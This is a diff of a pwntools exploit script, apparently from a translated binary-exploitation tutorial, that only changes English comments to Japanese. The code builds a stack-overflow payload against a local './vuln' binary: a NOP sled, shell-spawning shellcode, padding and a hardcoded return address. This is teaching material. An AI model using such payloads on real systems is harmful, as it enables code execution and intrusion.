@@ -30,10 +30,10 @@ context.binary = ELF('./vuln')
 
 p = process()
 
-payload = b'\x90' * 240                 # The NOPs
-payload += asm(shellcraft.sh())         # The shellcode
-payload = payload.ljust(312, b'A')      # Padding
-payload += p32(0xffffcfb4 + 120)        # Address of the buffer + half nop length
+payload = b'\x90' * 240                 # NOP
+payload += asm(shellcraft.sh())         # シェルコード
+payload = payload.ljust(312, b'A')      # パディング
+payload += p32(0xffffcfb4 + 120)        # バッファのアドレス + NOP の長さの半分
 
 log.info(p.clean())
 
